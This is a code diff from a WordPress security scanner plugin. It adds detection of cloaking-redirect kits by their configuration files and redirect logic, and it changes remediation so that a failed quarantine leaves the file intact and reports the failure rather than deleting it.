+		$dirs      = [ $core, $core . '/config', dirname( $core ), dirname( $core ) . '/config' ];
+		$want_root = realpath( $kit_root );
+		if ( ! $want_root ) return [];
+		$seen = [];
+		$n    = 0;
+
+		foreach ( $dirs as $dir ) {
+			$real = realpath( $dir );
+			if ( ! $real || isset( $seen[ $real ] ) || ! is_dir( $real ) ) continue;
+			$seen[ $real ] = true;
+
+			foreach ( (array) @scandir( $real ) as $name ) {
+				if ( $name === '.' || $name === '..' ) continue;
+				if ( substr( strtolower( $name ), -5 ) !== '.json' ) continue;
+				if ( ++$n > 60 ) return [];
+				$path = $real . DIRECTORY_SEPARATOR . $name;
+				if ( ! is_file( $path ) ) continue;
+				if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
+
+				$profile = self::cloak_config_profile( $path );
+				if ( ! $profile ) continue;
+
+				// A config sitting in <kit>/config/ implies <kit>; one sitting
+				// directly in <kit> implies <kit>.
+				$parent      = dirname( $path );
+				$implied     = ( strtolower( basename( $parent ) ) === 'config' ) ? dirname( $parent ) : $parent;
+				$implied_real = realpath( $implied );
+				if ( ! $implied_real || $implied_real !== $want_root ) continue;
+
+				return [ 'path' => $path, 'profile' => $profile, 'kit_root' => $implied_real ];
+			}
+		}
+
+		return [];
+	}
+
+	/**
+	 * 1.4.48: find the PHP in a candidate directory that consumes a cloaking
+	 * configuration and acts on it.
+	 *
+	 * Two conditions, both required. The file must read the cloak switches by
+	 * name as array subscripts - `$settings['black_org']` - which is the half
+	 * that cannot be renamed independently of the config. And it must actually
+	 * send the visitor somewhere, by header or by scripted location change,
+	 * which is the half that makes it a redirector rather than a filter.
+	 *
+	 * Either alone is ordinary: plenty of legitimate code redirects, and a
+	 * firewall plugin may well hold deny lists. Together, in a file that also
+	 * sits beside a hundred-thousand-entry blocklist, they are the engine.
+	 *
+	 * @param string $core Candidate kit sub-directory.
+	 * @return array<string, mixed> Empty when nothing qualifies.
+	 */
+	private static function find_cloak_config_reader( string $core ): array {
+		if ( ! class_exists( 'WPS_Indicators' ) || ! method_exists( 'WPS_Indicators', 'doorway_cloak_flag_keys' ) ) {
+			return [];
+		}
+		$flags = WPS_Indicators::doorway_cloak_flag_keys();
+		$n     = 0;
+
+		foreach ( (array) @scandir( $core ) as $name ) {
+			if ( $name === '.' || $name === '..' ) continue;
+			if ( strtolower( pathinfo( $name, PATHINFO_EXTENSION ) ) !== 'php' ) continue;
+			if ( ++$n > 60 ) break;
+
+			$path = $core . DIRECTORY_SEPARATOR . $name;
+			if ( ! is_file( $path ) ) continue;
+			$size = @filesize( $path );
+			if ( $size === false || $size < 256 || $size > 1048576 ) continue;
+
+			$raw = @file_get_contents( $path );
+			if ( $raw === false ) continue;
+			// 1.4.47: shared per-scan normalisation, so this costs nothing the
+			// other content checks have not already paid for.
+			$src = class_exists( 'WPS_Utils' ) ? WPS_Utils::normalised( $path, $raw ) : $raw;
+
+			$hits = 0;
+			foreach ( $flags as $flag ) {
+				if ( preg_match( '/\[\s*[\'"]' . preg_quote( $flag, '/' ) . '[\'"]\s*\]/i', $src ) ) $hits++;
+			}
+			if ( $hits < 4 ) continue;
+
+			$redirects = (bool) preg_match(
+				'/header\s*\(\s*[\'"]\s*Location\s*:|window\.location\.(replace|href|assign)|http_response_code\s*\(\s*30[1237]/i',
+				$src
+			);
+			if ( ! $redirects ) continue;
+
+			return [ 'path' => $path, 'flags' => $hits ];
+		}
+
+		return [];
 	}
 
 
@@ -7590,11 +9722,30 @@ class WPS_Scanner {
 			// 1.3.94: quarantine-first. Move the threat into the hardened store
 			// (reversible, preserves evidence) instead of destroying it. This also
 			// neutralises threats delete_directory refuses  notably a kit at the
-			// ABSPATH root, which is outside WP_CONTENT_DIR. Fall back to hard
-			// delete when quarantine is disabled, refuses, or fails, so a threat is
-			// never left live.
-			$quarantined_id = null;
+			// ABSPATH root, which is outside WP_CONTENT_DIR.
+			//
+			// 1.4.60 (CRIT-002): the fallback used to run whenever quarantine did
+			// not succeed, for ANY reason, on the reasoning that a threat should
+			// never be left live. That conflated two different situations.
+			//
+			// Quarantine DISABLED is a policy choice: the operator has said they
+			// want removal, so removal is what they get.
+			//
+			// Quarantine FAILING is an accident - no disk space, a permissions
+			// error, an unwritable store, a path the quarantine refused. None of
+			// those is evidence that destroying the file is safe. The old
+			// behaviour turned a recoverable incident into permanent data loss
+			// precisely when the machine was already misbehaving, and it did so
+			// most eagerly on the findings least likely to be right: a heuristic
+			// match on a file the operator would have wanted back.
+			//
+			// A live threat left in place for one more scan is recoverable. A
+			// legitimate file deleted because the quarantine directory was full
+			// is not.
+			$quarantined_id       = null;
+			$quarantine_attempted = false;
 			if ( self::quarantine_enabled() && class_exists( 'WPS_Quarantine' ) ) {
+				$quarantine_attempted = true;
 				$quarantined_id = WPS_Quarantine::quarantine(
 					(string) $target,
 					[
@@ -7608,7 +9759,32 @@ class WPS_Scanner {
 					$success = true;
 				}
 			}
+
+			if ( ! $success && $quarantine_attempted ) {
+				// Quarantine was tried and did not work. Stop here: leave the
+				// target untouched, keep the finding open, and say so loudly.
+				$f['remediated']          = false;
+				$f['remediation_failed']  = true;
+				$f['quarantine_failed']   = true;
+				$f['action'] = ( $f['action'] ?? '' )
+					. ' AUTOMATIC REMEDIATION DID NOT RUN. Quarantine was attempted and failed, so WP Perf Shield '
+					. 'left this file exactly as it is rather than deleting it - a quarantine failure means the '
+					. 'machine is not behaving, not that destroying the file is safe. The threat is still live. '
+					. 'Check that the quarantine store (' . self::display_path( WPS_Quarantine::store_dir() ) . ') exists, is writable and has free space, '
+					. 'then remediate manually or re-run the scan.';
+				WPS_Logger::log_event(
+					'auto_remediation_withheld',
+					self::format_auto_delete_log_subject( $f, $target, 'quarantine_failed_no_delete' )
+				);
+				WPS_Logger::write(
+					'auto-remediation withheld (quarantine failed, deletion NOT attempted): ' . (string) $target
+				);
+				continue;
+			}
+
 			if ( ! $success ) {
+				// Quarantine is switched off, so deletion is the remediation the
+				// operator configured.
 				if ( is_dir( $target ) ) {
 					$success = self::delete_directory( $target );
 				} elseif ( is_file( $target ) ) {
